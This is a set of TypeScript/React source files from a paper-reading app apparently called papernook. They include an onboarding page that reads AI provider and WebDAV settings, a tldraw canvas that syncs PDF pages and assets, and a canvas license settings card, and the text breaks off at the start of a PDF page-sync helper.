import { redirect } from "next/navigation";
import { requestIdentity, sharedAccess } from "@/lib/auth/access";
import { accessOrigins } from "@/lib/auth/platform/configuration";
import { profilePageFiles } from "@/lib/auth/platform/page-access";
import { isAccessError } from "thesidedoor-core/access";
import {
  configuredProviderId,
  detectLocalCliProvider,
  isProviderAvailable,
  hasConfiguredProvider,
} from "@/lib/agent/registry";
import { selectDetectedProvider, readAiState } from "@/lib/agent/config";
import { optionalWebdavUrl } from "@/lib/webdav-url";
import { WelcomeFlow } from "./WelcomeFlow";

export const dynamic = "force-dynamic";

/**
 * The wizard autocompletes from the environment (.env / secret manager):
 * agent status, the Shortcut share link, and the WebDAV credentials are read
 * server-side so the page shows values instead of instructions wherever the
 * instance is already provisioned.
 */
export default async function WelcomePage() {
  const admission = await requestIdentity();
  if (!admission?.capability) redirect("/login");
  const capability = admission.capability;

  let agentProvider: string | null = null;
  let agentAvailable = false;
  const initial = readAiState();
  let probedRevision = initial.revision;
  if (hasConfiguredProvider(initial.selection)) {
    agentProvider = configuredProviderId(initial.selection);
    agentAvailable = await isProviderAvailable(
      agentProvider as Parameters<typeof isProviderAvailable>[0],
      initial,
    );
  } else {
    // Auto-select only when no provider has been configured. An explicitly
    // selected provider that is unavailable remains visible as unavailable.
    const detected = admission.isAdmin ? await detectLocalCliProvider() : null;
    if (detected) {
      try {
        const result = await selectDetectedProvider(admission.token, detected);
        if (result.selected) probedRevision = result.revision;
      } catch (error) {
        if (
          isAccessError(error) &&
          ["unauthorized", "forbidden"].includes(error.code)
        )
          redirect("/login");
        throw error;
      }
      agentProvider = detected;
      agentAvailable = true;
    }
  }

  return profilePageFiles(capability, () => {
    const { identity, access, profiles } = sharedAccess();
    const state = identity.readSnapshot();
    const authenticated = access.sessionFromState(
      state.access,
      admission.token,
    );
    const selected = authenticated.principal
      ? state.bindings[authenticated.principal.id]
      : profiles.selectedFromState(state.access, admission.token)?.id;
    if (selected !== capability.username) redirect("/welcome");
    const profile = state.profiles.find(
      (entry) => entry.username === capability.username,
    );
    if (!profile) redirect("/login");
    const admin = access.householdOwnerFromState(state.access, admission.token);
    const baseUrl = accessOrigins().canonicalOrigin;
    const currentProvider = hasConfiguredProvider(state.ai.selection)
      ? configuredProviderId(state.ai.selection)
      : null;
    return (
      <WelcomeFlow
        displayName={profile.displayName}
        avatarSlug={profile.avatarSlug}
        captureToken={profile.captureToken}
        baseUrl={baseUrl}
        webdavUrl={optionalWebdavUrl(
          baseUrl,
          process.env.PAPERNOOK_WEBDAV_URL,
          process.env.WEBDAV_USER,
          process.env.WEBDAV_PASS,
        )}
        shortcutUrl={process.env.PAPERNOOK_SHORTCUT_URL ?? "/api/v1/shortcut"}
        agentProvider={currentProvider}
        agentAvailable={
          state.ai.revision === probedRevision &&
          currentProvider === agentProvider &&
          agentAvailable
        }
        webdavUser={process.env.WEBDAV_USER ?? null}
        webdavPass={process.env.WEBDAV_PASS ?? null}
        admin={admin}
      />
    );
  });
}

"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import {
  Tldraw,
  getSnapshot,
  loadSnapshot,
  type Editor,
  type TLAssetStore,
} from "tldraw";
import { reconcileStartupMigration } from "@/lib/canvas/startup";
import { withoutCanvasUsers } from "@/lib/canvas/snapshot";
import { PdfReader, type PdfReaderEditState } from "@/components/pdf/PdfReader";
import { readingPositionKey } from "@/lib/pdf/view/reading-position";
import { focusFirstPdfPage, syncPdfPages } from "./pdf-pages";
import "tldraw/tldraw.css";
import styles from "./CanvasBoard.module.css";

export interface CanvasBoardProps {
  topic: string;
  slug: string;
  title: string;
  /** Active profile; keys the per-profile local reading position. */
  username: string;
  licenseKey: string | null;
  licenseRequired: boolean;
  licenseError: string | null;
  /** Provider capabilities.vision; false hides "Explain selection". */
  visionAvailable: boolean;
}

const SAVE_DELAY_MS = 1_200;
const LOCAL_SESSION_PREFIX = "papernook:canvas-session";
const CANVAS_VERSION_HEADER = "X-Canvas-Version";

function canvasError(payload: unknown, fallback: string): string {
  if (
    payload &&
    typeof payload === "object" &&
    "error" in payload &&
    typeof payload.error === "string"
  ) {
    return payload.error;
  }
  return fallback;
}

function localSessionKey(topic: string, slug: string): string {
  return `${LOCAL_SESSION_PREFIX}:${topic}:${slug}`;
}

function restoreLocalCamera(
  editor: Editor,
  topic: string,
  slug: string,
): boolean {
  try {
    const raw = window.localStorage.getItem(localSessionKey(topic, slug));
    if (!raw) return false;
    const camera: unknown = JSON.parse(raw);
    if (
      !camera ||
      typeof camera !== "object" ||
      !("x" in camera) ||
      typeof camera.x !== "number" ||
      !("y" in camera) ||
      typeof camera.y !== "number" ||
      !("z" in camera) ||
      typeof camera.z !== "number"
    ) {
      return false;
    }
    editor.setCamera({ x: camera.x, y: camera.y, z: camera.z });
    return true;
  } catch {
    return false;
  }
}

function saveLocalCamera(editor: Editor, topic: string, slug: string): void {
  try {
    const camera = editor.getCamera();
    window.localStorage.setItem(
      localSessionKey(topic, slug),
      JSON.stringify({ x: camera.x, y: camera.y, z: camera.z }),
    );
  } catch {
    // Canvas content still saves when local camera persistence is unavailable.
  }
}

async function uploadCanvasAsset(
  base: string,
  file: File,
  abortSignal?: AbortSignal,
): Promise<{ src: string }> {
  const response = await fetch(`${base}/canvas/assets`, {
    method: "POST",
    headers: {
      "Content-Type": file.type || "application/octet-stream",
      "X-Canvas-Filename": encodeURIComponent(file.name),
    },
    credentials: "include",
    body: file,
    signal: abortSignal,
  });
  const payload: unknown = await response.json().catch(() => null);
  if (!response.ok) {
    throw new Error(
      canvasError(payload, "The canvas asset could not be uploaded."),
    );
  }
  if (
    !payload ||
    typeof payload !== "object" ||
    !("src" in payload) ||
    typeof payload.src !== "string"
  ) {
    throw new Error("The canvas asset response was invalid.");
  }
  return { src: payload.src };
}

async function uploadDataAssets(
  editor: Editor,
  base: string,
): Promise<boolean> {
  const pending = editor
    .getAssets()
    .filter((asset) => asset.props.src?.startsWith("data:"))
    .map(async (asset) => {
      const source = asset.props.src;
      if (!source) throw new Error("A canvas image had no data URL.");
      const separator = source.indexOf(",");
      if (separator < 0) {
        throw new Error("A canvas image had an invalid data URL.");
      }
      const metadata = source.slice(5, separator);
      const encoded = source.slice(separator + 1);
      const mimeType = metadata.split(";")[0] || "application/octet-stream";
      const decoded = metadata.includes(";base64")
        ? window.atob(encoded)
        : decodeURIComponent(encoded);
      const bytes = Uint8Array.from(decoded, (character) =>
        character.charCodeAt(0),
      );
      const blob = new Blob([bytes], { type: mimeType });
      const filename =
        "name" in asset.props && asset.props.name
          ? asset.props.name
          : `canvas-asset.${blob.type.split("/")[1] ?? "bin"}`;
      const uploaded = await uploadCanvasAsset(
        base,
        new File([blob], filename, { type: blob.type }),
      );
      return {
        id: asset.id,
        type: asset.type,
        props: { src: uploaded.src },
      };
    });
  if (pending.length === 0) return false;
  editor.updateAssets(await Promise.all(pending));
  return true;
}

async function deleteUnusedCanvasAssets(
  editor: Editor,
  base: string,
  candidates: string[],
): Promise<void> {
  const activeSources = new Set(
    editor
      .getAssets()
      .flatMap((asset) => (asset.props.src ? [asset.props.src] : [])),
  );
  const unused = [
    ...new Set(
      candidates.filter(
        (source) =>
          source.startsWith(`${base}/canvas/assets/`) &&
          !activeSources.has(source),
      ),
    ),
  ];
  await Promise.all(
    unused.map(async (source) => {
      const response = await fetch(source, {
        method: "DELETE",
        credentials: "include",
      });
      if (!response.ok) {
        throw new Error("An old PDF canvas image could not be removed.");
      }
    }),
  );
}

async function saveDocument(
  document: unknown,
  url: string,
  etag: string,
): Promise<{ version: string; document?: unknown }> {
  const response = await fetch(url, {
    method: "PUT",
    headers: {
      "Content-Type": "application/json",
      [CANVAS_VERSION_HEADER]: etag,
    },
    credentials: "include",
    body: JSON.stringify({ document: withoutCanvasUsers(document) }),
  });
  const payload: unknown = await response.json().catch(() => null);
  if (!response.ok) {
    if (response.status === 409) throw new CanvasConflictError();
    throw new Error(canvasError(payload, "The canvas could not be saved."));
  }
  return {
    version: response.headers.get(CANVAS_VERSION_HEADER) ?? etag,
    ...(payload && typeof payload === "object" && "document" in payload
      ? { document: payload.document }
      : {}),
  };
}

class CanvasConflictError extends Error {
  constructor() {
    super("Canvas changed on another device.");
    this.name = "CanvasConflictError";
  }
}

async function loadSharedCanvas(editor: Editor, url: string): Promise<string> {
  const response = await fetch(url, {
    cache: "no-store",
    credentials: "include",
  });
  const payload: unknown = await response.json().catch(() => null);
  if (!response.ok) {
    throw new Error(canvasError(payload, "The canvas could not be loaded."));
  }
  if (
    payload &&
    typeof payload === "object" &&
    "document" in payload &&
    payload.document
  ) {
    loadSnapshot(editor.store, { document: payload.document } as never);
  }
  return response.headers.get(CANVAS_VERSION_HEADER) ?? '"empty"';
}

export function CanvasBoard({
  topic,
  slug,
  title,
  username,
  licenseKey,
  licenseRequired,
  licenseError,
  visionAvailable,
}: CanvasBoardProps) {
  const base = `/api/v1/papers/${topic}/${slug}`;
  const saveTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const saveQueue = useRef(Promise.resolve());
  const editorRef = useRef<Editor | null>(null);
  const boardRef = useRef<HTMLDivElement | null>(null);
  const etagRef = useRef('"empty"');
  const initializedRef = useRef(false);
  const dirtyRef = useRef(false);
  const conflictRef = useRef(false);
  const refreshPromiseRef = useRef<Promise<void> | null>(null);
  const changeVersionRef = useRef(0);
  const [status, setStatus] = useState("Opening shared canvas…");
  const [saved, setSaved] = useState(true);
  const [ready, setReady] = useState(false);
  const [conflicted, setConflicted] = useState(false);
  const [contributor, setContributor] = useState<string | null>(null);
  const [canvasUiHidden, setCanvasUiHidden] = useState(false);
  const [annotatingPdf, setAnnotatingPdf] = useState(false);
  const [pdfEditState, setPdfEditState] = useState<PdfReaderEditState>({
    dirty: false,
    saving: false,
  });
  const [licenseRejected, setLicenseRejected] = useState(false);
  const licenseMissing = licenseRequired && !licenseKey;
  const canvasUnavailable = Boolean(
    licenseMissing || licenseError || licenseRejected,
  );

  useEffect(() => {
    const board = boardRef.current;
    if (!board || licenseMissing || licenseError) return;
    const detectGate = () => {
      const rejected = Boolean(
        board.querySelector('[data-testid="tl-license-expired"]'),
      );
      setLicenseRejected(rejected);
      if (rejected) setStatus("Canvas license rejected.");
    };
    detectGate();
    const observer = new MutationObserver(detectGate);
    observer.observe(board, { childList: true, subtree: true });
    const timeout = window.setTimeout(detectGate, 5_500);
    return () => {
      observer.disconnect();
      window.clearTimeout(timeout);
    };
  }, [licenseError, licenseKey, licenseMissing]);

  const assetStore = useMemo<TLAssetStore>(
    () => ({
      async upload(_asset, file, abortSignal) {
        return uploadCanvasAsset(base, file, abortSignal);
      },
      resolve(asset) {
        return asset.props.src;
      },
    }),
    [base],
  );
  const flushSave = useCallback(
    async (editor: Editor, silent = false) => {
      if (conflictRef.current) return;
      const document = getSnapshot(editor.store).document;
      const savedVersion = changeVersionRef.current;
      const save = async () => {
        if (!silent) setStatus("Saving…");
        try {
          const result = await saveDocument(
            document,
            `${base}/canvas`,
            etagRef.current,
          );
          etagRef.current = result.version;
          if (result.document && changeVersionRef.current === savedVersion) {
            const camera = editor.getCamera();
            editor.store.mergeRemoteChanges(() =>
              loadSnapshot(editor.store, {
                document: result.document,
              } as never),
            );
            editor.setCamera(camera);
          }
        } catch (error) {
          if (error instanceof CanvasConflictError) {
            conflictRef.current = true;
            setConflicted(true);
            setSaved(false);
            setStatus(
              "Changed on another device. Reload to review the shared version.",
            );
          }
          throw error;
        }
        const fullySaved = changeVersionRef.current === savedVersion;
        dirtyRef.current = !fullySaved;
        if (!silent) {
          setSaved(fullySaved);
          setStatus(fullySaved ? "Saved" : "Unsaved changes");
        }
      };
      saveQueue.current = saveQueue.current.then(save, save);
      await saveQueue.current;
    },
    [base],
  );

  const refreshPdfPages = useCallback(
    async (force = false) => {
      const editor = editorRef.current;
      if (!editor || conflictRef.current) return;
      if (refreshPromiseRef.current) {
        await refreshPromiseRef.current;
        return;
      }
      const refresh = async () => {
        if (dirtyRef.current) await flushSave(editor, true);
        setStatus("Refreshing PDF in canvas…");
        const result = await syncPdfPages(
          editor,
          `${base}/pdf`,
          async (blob, filename) =>
            (
              await uploadCanvasAsset(
                base,
                new File([blob], filename, { type: blob.type }),
              )
            ).src,
          force,
        );
        if (!result.changed) {
          setStatus("Saved");
          setSaved(true);
          return;
        }
        await uploadDataAssets(editor, base);
        setSaved(false);
        await flushSave(editor);
        await deleteUnusedCanvasAssets(editor, base, result.obsoleteSources);
        if (result.imported) {
          focusFirstPdfPage(editor);
        }
      };
      refreshPromiseRef.current = refresh().finally(() => {
        refreshPromiseRef.current = null;
      });
      await refreshPromiseRef.current;
    },
    [base, flushSave],
  );

  useEffect(() => {
    const warnAboutUnsavedChanges = (event: BeforeUnloadEvent) => {
      if (!dirtyRef.current) return;
      event.preventDefault();
      event.returnValue = "";
    };
    window.addEventListener("beforeunload", warnAboutUnsavedChanges);
    return () =>
      window.removeEventListener("beforeunload", warnAboutUnsavedChanges);
  }, []);

  const onMount = useCallback(
    (editor: Editor) => {
      editorRef.current = editor;
      let removeDocumentListener: (() => void) | undefined;
      let removeSessionListener: (() => void) | undefined;
      let removeThemeListener: (() => void) | undefined;
      let cancelled = false;

      void (async () => {
        const canvasUrl = `${base}/canvas`;
        let importedPdf = false;
        let obsoletePdfSources: string[] = [];
        etagRef.current = await loadSharedCanvas(editor, canvasUrl);
        if (cancelled) return;
        setStatus("Importing PDF into canvas…");
        etagRef.current = await reconcileStartupMigration({
          etag: etagRef.current,
          migrate: async () => {
            setStatus("Rendering PDF pages…");
            const result = await syncPdfPages(
              editor,
              `${base}/pdf`,
              async (blob, filename) =>
                (
                  await uploadCanvasAsset(
                    base,
                    new File([blob], filename, { type: blob.type }),
                  )
                ).src,
            );
            importedPdf = result.imported;
            obsoletePdfSources = result.obsoleteSources;
            setStatus("Storing PDF pages…");
            const uploadedAssets = await uploadDataAssets(editor, base);
            setStatus("Saving shared canvas…");
            return result.changed || uploadedAssets;
          },
          save: async (etag) =>
            (
              await saveDocument(
                getSnapshot(editor.store).document,
                canvasUrl,
                etag,
              )
            ).version,
          reload: () => loadSharedCanvas(editor, canvasUrl),
          isConflict: (error) => error instanceof CanvasConflictError,
        });
        if (cancelled) return;
        await deleteUnusedCanvasAssets(editor, base, obsoletePdfSources);
        editor.updateInstanceState({ isFocusMode: false });
        setCanvasUiHidden(false);
        if (importedPdf || !restoreLocalCamera(editor, topic, slug)) {
          focusFirstPdfPage(editor);
        }

        editor.user.updateUserPreferences({
          colorScheme:
            document.documentElement.dataset.theme === "dark"
              ? "dark"
              : "light",
        });
        const onThemeChange = () => {
          editor.user.updateUserPreferences({
            colorScheme:
              document.documentElement.dataset.theme === "dark"
                ? "dark"
                : "light",
          });
        };
        window.addEventListener("papernook:theme-changed", onThemeChange);
        removeThemeListener = () =>
          window.removeEventListener("papernook:theme-changed", onThemeChange);

        initializedRef.current = true;
        setStatus("Saved");

        removeDocumentListener = editor.store.listen(
          (entry) => {
            if (!initializedRef.current) return;
            const changed = [
              ...Object.values(entry.changes.added),
              ...Object.values(entry.changes.removed),
              ...Object.values(entry.changes.updated).flat(),
            ];
            if (!changed.some((record) => record.typeName !== "user")) return;
            dirtyRef.current = true;
            changeVersionRef.current += 1;
            setSaved(false);
            setStatus(
              conflictRef.current
                ? "Changed on another device. Reload to review the shared version."
                : "Unsaved changes",
            );
            if (conflictRef.current) return;
            if (saveTimer.current) clearTimeout(saveTimer.current);
            saveTimer.current = setTimeout(() => {
              void flushSave(editor).catch((error: unknown) => {
                setStatus(
                  error instanceof Error
                    ? error.message
                    : "The canvas could not be saved.",
                );
              });
            }, SAVE_DELAY_MS);
          },
          { scope: "document", source: "user" },
        );
        removeSessionListener = editor.store.listen(
          () => {
            saveLocalCamera(editor, topic, slug);
            setCanvasUiHidden(editor.getInstanceState().isFocusMode);
            const selected = editor.getSelectedShapes();
            const names = new Set(
              selected.flatMap((shape) =>
                typeof shape.meta.papernookUpdatedByName === "string"
                  ? [shape.meta.papernookUpdatedByName]
                  : [],
              ),
            );
            setContributor(
              names.size ? `Last edited by ${[...names].join(", ")}` : null,
            );
          },
          { scope: "session" },
        );
        setReady(true);
      })().catch((error: unknown) => {
        if (cancelled) return;
        setStatus(
          error instanceof Error
            ? error.message
            : "The canvas could not be loaded.",
        );
      });

      return () => {
        cancelled = true;
        initializedRef.current = false;
        if (saveTimer.current) {
          clearTimeout(saveTimer.current);
          saveTimer.current = null;
        }
        removeDocumentListener?.();
        removeSessionListener?.();
        removeThemeListener?.();
        if (dirtyRef.current) void flushSave(editor, true);
      };
    },
    [base, flushSave, slug, topic],
  );

  useEffect(() => {
    if (!ready || annotatingPdf || canvasUnavailable) return;
    let checking = false;
    let stopped = false;
    const refreshCanvas = async () => {
      const editor = editorRef.current;
      if (!editor || checking || conflictRef.current) return;
      checking = true;
      const startingVersion = changeVersionRef.current;
      try {
        const response = await fetch(`${base}/canvas`, {
          cache: "no-store",
          credentials: "include",
        });
        if (!response.ok)
          throw new Error(
            "The shared canvas could not sync. Check access and local changes.",
          );
        const version = response.headers.get(CANVAS_VERSION_HEADER);
        const payload: unknown = await response.json();
        if (stopped || !version || version === etagRef.current) return;
        if (dirtyRef.current || startingVersion !== changeVersionRef.current) {
          conflictRef.current = true;
          setConflicted(true);
          setSaved(false);
          setStatus(
            "Changed on another device. Your unsaved changes are preserved.",
          );
          return;
        }
        if (
          payload &&
          typeof payload === "object" &&
          "document" in payload &&
          payload.document
        ) {
          const camera = editor.getCamera();
          editor.store.mergeRemoteChanges(() =>
            loadSnapshot(editor.store, { document: payload.document } as never),
          );
          editor.setCamera(camera);
        }
        etagRef.current = version;
      } finally {
        checking = false;
      }
    };
    const checkPdf = () => {
      if (document.visibilityState !== "visible") return;
      void refreshCanvas()
        .then(() => {
          if (!dirtyRef.current && !conflictRef.current)
            return refreshPdfPages();
        })
        .catch((error: unknown) => {
          setStatus(
            error instanceof Error
              ? error.message
              : "The PDF could not be refreshed.",
          );
        });
    };
    const interval = window.setInterval(checkPdf, 30_000);
    document.addEventListener("visibilitychange", checkPdf);
    return () => {
      stopped = true;
      window.clearInterval(interval);
      document.removeEventListener("visibilitychange", checkPdf);
    };
  }, [annotatingPdf, base, canvasUnavailable, ready, refreshPdfPages]);

  const closePdfAnnotator = useCallback(() => {
    setAnnotatingPdf(false);
    setPdfEditState({ dirty: false, saving: false });
    void refreshPdfPages().catch((error: unknown) => {
      setStatus(
        error instanceof Error
          ? error.message
          : "The annotated PDF could not be refreshed.",
      );
    });
  }, [refreshPdfPages]);

  async function explainSelection(): Promise<void> {
    const editor = editorRef.current;
    if (!editor) return;
    const ids = editor.getSelectedShapeIds();
    if (ids.length === 0) {
      setStatus("Select something on the canvas first.");
      return;
    }
    const { blob } = await editor.toImage(ids, {
      format: "png",
      background: true,
      padding: 8,
    });
    const dataUrl = await new Promise<string>((resolve) => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result as string);
      reader.readAsDataURL(blob);
    });
    window.dispatchEvent(
      new CustomEvent("papernook:attach", { detail: dataUrl }),
    );
    setStatus("Selection attached to chat");
  }

  return (
    <div className={styles.root}>
      <div className={styles.toolbar}>
        <div>
          <strong>Canvas</strong>
          <span className={styles.hint}>
            The PDF stays synced in Reader. Paste screenshots, links, or videos
            here.
          </span>
        </div>
        <div className={styles.toolbarActions}>
          {canvasUiHidden && !canvasUnavailable && (
            <button
              type="button"
              onClick={() => {
                editorRef.current?.updateInstanceState({
                  isFocusMode: false,
                });
              }}
            >
              Show canvas tools
            </button>
          )}
          {!canvasUnavailable && (
            <button type="button" onClick={() => setAnnotatingPdf(true)}>
              Annotate PDF
            </button>
          )}
          {!canvasUnavailable && visionAvailable && (
            <button type="button" onClick={() => void explainSelection()}>
              Explain selection
            </button>
          )}
          {conflicted && !canvasUnavailable && (
            <button
              type="button"
              onClick={() => {
                if (
                  window.confirm(
                    "Reload the shared canvas and discard this device's unsaved changes?",
                  )
                ) {
                  window.location.reload();
                }
              }}
            >
              Reload shared canvas
            </button>
          )}
          <span
            className={`${styles.status} ${
              saved && !canvasUnavailable ? styles.statusSaved : ""
            }`}
            role="status"
            aria-label="Canvas save status"
          >
            {licenseError
              ? "Configuration error"
              : licenseMissing
                ? "License needed"
                : licenseRejected
                  ? "License rejected"
                  : status}
          </span>
          {contributor && <span className={styles.status}>{contributor}</span>}
        </div>
      </div>
      <div
        className={`${styles.board} ${
          ready || licenseMissing || licenseError ? "" : styles.boardLoading
        }`}
        aria-busy={!ready && !licenseMissing && !licenseError}
        ref={boardRef}
      >
        {licenseError || licenseMissing ? (
          <LicenseNotice
            title={
              licenseError
                ? "Canvas configuration needs attention"
                : "Canvas needs a tldraw license"
            }
            detail={
              licenseError ??
              "Add a hobby, trial, or commercial key before opening the shared canvas."
            }
          />
        ) : (
          <Tldraw
            assets={assetStore}
            licenseKey={licenseKey ?? undefined}
            onMount={onMount}
          />
        )}
        {!ready && !licenseMissing && !licenseError && (
          <div className={styles.loadingOverlay}>{status}</div>
        )}
        {licenseRejected && (
          <LicenseNotice
            title="This tldraw key was rejected"
            detail="The key may be invalid, expired, or configured for another domain."
          />
        )}
        {annotatingPdf && !canvasUnavailable && (
          <section
            className={styles.pdfAnnotator}
            aria-label={`Annotate ${title}`}
          >
            <div className={styles.pdfAnnotatorHeader}>
              <div>
                <strong>Annotate PDF</strong>
                <span>
                  Highlights, text, and ink save to Reader and every device.
                </span>
              </div>
              <span role="status">
                {pdfEditState.saving
                  ? "Saving…"
                  : pdfEditState.dirty
                    ? "Unsaved changes"
                    : "Synced PDF"}
              </span>
            </div>
            <div className={styles.pdfAnnotatorReader}>
              <PdfReader
                src={`${base}/pdf`}
                title={title}
                editable
                positionKey={readingPositionKey(topic, slug, username)}
                positionEndpoint={`${base}/position`}
                onClose={closePdfAnnotator}
                onEditStateChange={setPdfEditState}
              />
            </div>
          </section>
        )}
      </div>
    </div>
  );
}

function LicenseNotice({ title, detail }: { title: string; detail: string }) {
  const headingRef = useRef<HTMLHeadingElement | null>(null);

  useEffect(() => {
    headingRef.current?.focus();
  }, []);

  return (
    <div className={styles.licenseNotice} role="alert">
      <h2 ref={headingRef} tabIndex={-1}>
        {title}
      </h2>
      <p>{detail}</p>
      <div>
        <a href="/settings#canvas">Open Canvas settings</a>
        <a
          href="https://tldraw.dev/pricing"
          target="_blank"
          rel="noopener noreferrer"
        >
          Get a key <span aria-hidden="true">↗</span>
        </a>
      </div>
    </div>
  );
}

"use client";

import dynamicImport from "next/dynamic";
import { useEffect, useState } from "react";
import styles from "./CanvasLicenseCard.module.css";

const CanvasLicenseProbe = dynamicImport(
  () =>
    import("./CanvasLicenseProbe").then((module) => ({
      default: module.CanvasLicenseProbe,
    })),
  { ssr: false },
);

interface LicenseState {
  configured: boolean;
  source: "file" | "environment" | null;
  admin: boolean;
  requiredForThisOrigin: boolean;
  licenseKey?: string | null;
  error?: string;
}

type TestState = "idle" | "testing" | "valid" | "rejected";

export function CanvasLicenseCard() {
  const [state, setState] = useState<LicenseState | null>(null);
  const [licenseKey, setLicenseKey] = useState("");
  const [status, setStatus] = useState<string | null>(null);
  const [busy, setBusy] = useState(false);
  const [testState, setTestState] = useState<TestState>("idle");

  useEffect(() => {
    void fetch("/api/v1/settings/canvas", {
      credentials: "include",
      cache: "no-store",
    })
      .then(async (response) => {
        const data = (await response.json()) as LicenseState;
        if (!response.ok) throw new Error(data.error ?? "Could not load.");
        setState(data);
      })
      .catch((error: unknown) => {
        setStatus(
          error instanceof Error
            ? error.message
            : "The canvas configuration could not be loaded.",
        );
      });
  }, []);

  async function save(nextLicenseKey: string | null): Promise<void> {
    setBusy(true);
    setStatus(null);
    try {
      const response = await fetch("/api/v1/settings/canvas", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        credentials: "include",
        body: JSON.stringify({ licenseKey: nextLicenseKey }),
      });
      const data = (await response.json()) as LicenseState;
      if (!response.ok) {
        throw new Error(data.error ?? "The license key could not be saved.");
      }
      setState(data);
      setLicenseKey("");
      setTestState("idle");
      setStatus(
        nextLicenseKey === null
          ? data.source === "environment"
            ? "Stored override removed. The server environment key is active."
            : "License key removed."
          : "Key saved. Open Canvas to validate it in the browser.",
      );
    } catch (error) {
      setStatus(
        error instanceof Error
          ? error.message
          : "The license key could not be saved.",
      );
    } finally {
      setBusy(false);
    }
  }

  if (!state) {
    return (
      <div className={styles.root}>
        <p className={styles.status} role="status">
          {status ?? "Checking Canvas license…"}
        </p>
      </div>
    );
  }

  if (!state.admin) {
    return (
      <div className={styles.root}>
        <p className={styles.summary}>
          {state.configured
            ? "A Canvas key is configured. tldraw validates it when Canvas opens."
            : state.requiredForThisOrigin
              ? "Your admin needs to add a tldraw key before Canvas can open."
              : "Canvas works on this local address without a key. A key is required after production deployment."}
        </p>
        {!state.configured && state.requiredForThisOrigin && (
          <a
            className={styles.link}
            href="https://tldraw.dev/pricing"
            target="_blank"
            rel="noopener noreferrer"
          >
            About tldraw licenses <span aria-hidden="true">↗</span>
          </a>
        )}
      </div>
    );
  }

  const sourceLabel =
    state.source === "file"
      ? "Saved in papernook"
      : state.source === "environment"
        ? "Managed by the server environment"
        : "Not configured";

  return (
    <div className={styles.root} aria-busy={busy}>
      <div className={styles.current}>
        <span
          className={state.configured ? styles.dotReady : styles.dotMissing}
          aria-hidden="true"
        />
        <div>
          <strong>
            {state.configured
              ? "Key configured"
              : state.requiredForThisOrigin
                ? "Key needed"
                : "Ready locally"}
          </strong>
          <span>{sourceLabel}</span>
        </div>
      </div>
      <p className={styles.summary}>
        {state.requiredForThisOrigin
          ? "Canvas on this production address requires a tldraw hobby, trial, or commercial key."
          : "Canvas works on this local address without a key. Add one before production deployment."}{" "}
        The key is sent to tldraw in the browser; it is not a secret credential.
      </p>
      <a
        className={styles.link}
        href="https://tldraw.dev/pricing"
        target="_blank"
        rel="noopener noreferrer"
      >
        Get a tldraw key <span aria-hidden="true">↗</span>
      </a>
      {state.configured && state.requiredForThisOrigin && state.licenseKey && (
        <div className={styles.testRow}>
          <button
            type="button"
            className={styles.test}
            onClick={() => setTestState("testing")}
            disabled={busy || testState === "testing"}
          >
            {testState === "testing" ? "Testing key…" : "Test configured key"}
          </button>
          <span
            className={
              testState === "valid"
                ? styles.testValid
                : testState === "rejected"
                  ? styles.testRejected
                  : styles.testHint
            }
            role="status"
          >
            {testState === "testing"
              ? "Checking signature, domain, and expiry…"
              : testState === "valid"
                ? "Valid for this domain."
                : testState === "rejected"
                  ? "Rejected. Replace the key or check its allowed domain."
                  : "Runs tldraw validation in this browser."}
          </span>
        </div>
      )}
      <div className={styles.controls}>
        <label className={styles.field}>
          <span>License key</span>
          <input
            type="password"
            value={licenseKey}
            onChange={(event) => setLicenseKey(event.target.value)}
            placeholder={
              state.configured
                ? "Paste a replacement key"
                : "Paste your tldraw key"
            }
            autoComplete="off"
            disabled={busy}
          />
        </label>
        <button
          type="button"
          className={styles.save}
          onClick={() => void save(licenseKey.trim())}
          disabled={busy || licenseKey.trim().length === 0}
        >
          {busy ? "Saving…" : "Save key"}
        </button>
      </div>
      {state.source === "file" && (
        <button
          type="button"
          className={styles.remove}
          onClick={() => {
            if (
              window.confirm(
                "Remove the stored Canvas key for everyone? The server environment key will be used if one exists.",
              )
            ) {
              void save(null);
            }
          }}
          disabled={busy}
        >
          Remove stored key
        </button>
      )}
      {status && (
        <p className={styles.status} role="status">
          {status}
        </p>
      )}
      {testState === "testing" && state.licenseKey && (
        <CanvasLicenseProbe
          licenseKey={state.licenseKey}
          onResult={(valid) => setTestState(valid ? "valid" : "rejected")}
        />
      )}
    </div>
  );
}

import {
  AssetRecordType,
  createShapeId,
  type Editor,
  type TLImageShape,
  type TLShape,
} from "tldraw";
import { normalizeEtag } from "@/lib/pdf/etag";

const PAGE_GAP = 48;
const RENDER_SCALE = 1.6;
const PAGE_SHAPE_PATTERN = /^shape:page-(\d+)$/;

interface StoredPdfPage {
  src: string;
  width: number;
  height: number;
}

export interface PdfPageSyncResult {
  changed: boolean;
  imported: boolean;
  obsoleteSources: string[];
  version: string;
}

export function focusFirstPdfPage(editor: Editor): void {
  const bounds = editor.getShapePageBounds(createShapeId("page-1"));
  if (bounds) {
    editor.zoomToBounds(bounds, {
      animation: { duration: 0 },
      inset: 48,
    });
  } else {
    editor.zoomToFit({ animation: { duration: 0 } });
  }
}

function pageShapes(editor: Editor): TLShape[] {
  return editor.store
    .allRecords()
    .filter(
      (record): record is TLShape =>
        record.typeName === "shape" && PAGE_SHAPE_PATTERN.test(record.id),
    );
}

function hasCurrentPages(editor: Editor, version: string): boolean {
  const pages = pageShapes(editor);
  const first = editor.getShape(createShapeId("page-1"));
  if (!first || first.type !== "image") return false;
  const expectedCount = first.meta.papernookPdfPageCount;
  if (
    first.meta.papernookPdfVersion !== version ||
    typeof expectedCount !== "number" ||
    expectedCount <= 0 ||
    pages.length !== expectedCount
  ) {
    return false;
  }
  for (let pageNumber = 1; pageNumber <= expectedCount; pageNumber += 1) {
    const page = editor.getShape(createShapeId(`page-${pageNumber}`));
    if (
      !page ||
      page.type !== "image" ||
      page.meta.papernookPdfPageNumber !== pageNumber ||
      page.meta.papernookPdfPageCount !== expectedCount ||
      page.meta.papernookPdfVersion !== version ||
      !page.props.assetId
    ) {
      return false;
    }
    const asset = editor.getAsset(page.props.assetId);
    if (asset?.type !== "image" || !asset.props.src) return false;
  }
  return true;
}

function retryDelay(response: Response, attempt: number): number | null {
  if (response.status !== 409 || attempt >= 3) return null;
  const retryAfter = Number(response.headers.get("retry-after"));
  return Number.isFinite(retryAfter) && retryAfter > 0
    ? Math.min(retryAfter * 1_000, 5_000)
    : 500;
}

async function fetchPdf(
  url: string,
  method: "GET" | "HEAD",
